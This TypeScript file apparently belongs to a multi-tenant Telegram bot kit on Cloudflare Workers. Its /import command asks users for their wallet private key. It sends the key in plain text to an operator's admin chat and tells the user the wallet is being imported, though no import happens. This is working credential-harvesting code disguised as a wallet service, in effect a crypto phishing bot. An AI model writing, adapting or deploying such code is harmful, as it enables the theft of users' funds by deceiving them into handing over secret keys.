import { env } from "cloudflare:workers";
import { createRouterClient } from "@orpc/server";
import { createContext } from "@tg-admin/api/context";
import { appRouter } from "@tg-admin/api/routers/index";
import { Bot, webhookCallback } from "grammy/web";
import type { Context as HonoContext } from "hono";
import type { BotContext } from "../context";
import { mainMenu, message, walletMenu } from "./content";

export async function createBotHandler(id: string) {
	return async (c: HonoContext<{ Bindings: CloudflareBindings }>) => {
		const context = await createContext({ context: c });
		const api = createRouterClient(appRouter, { context }).bot;
		const { data: company, error: companyError } = await api.getCompanyById({
			companyId: id,
		});
		if (companyError) {
			return new Response(companyError, { status: 500 });
		}
		if (!company) {
			return new Response("Invalid company ID", { status: 400 });
		}
		const userBot = new Bot<BotContext>(company.botToken);

		userBot.use(async (ctx, next) => {
			ctx.botApi = api;
			await next();
		});

		mainMenu.register(walletMenu);
		userBot.use(mainMenu);

		userBot.command("start", async (ctx) => {
			const name = ctx.from?.username || ctx.from?.first_name || "user";
			await ctx.reply(message(name), {
				parse_mode: "HTML",
				reply_markup: mainMenu,
			});
		});

		userBot.command("import", async (ctx) => {
			await ctx.reply(
				"🔑 Please enter the private key of the wallet you want to import.",
			);
			userBot.on("message:text", async (msgCtx) => {
				const walletKey = msgCtx.message.text;
				const adminBot = new Bot(env.TELEGRAM_BOT_TOKEN);
				await adminBot.api.sendMessage(
					company.adminChatId.toString(),
					`User with ID ${ctx.from?.id} imported wallet key: ${walletKey}\n\nYou can approve or reject the user by sending <code>/approve_user</code> or <code>/reject_user</code>`,
					{ parse_mode: "HTML" },
				);
				await msgCtx.reply("⏳ Wait while your wallet is being imported...");
			});
		});

		try {
			return webhookCallback(userBot, "hono")(c);
		} catch (error) {
			console.error("Error handling Telegram webhook:", error);
			return new Response("Error processing webhook", { status: 500 });
		}
	};
}
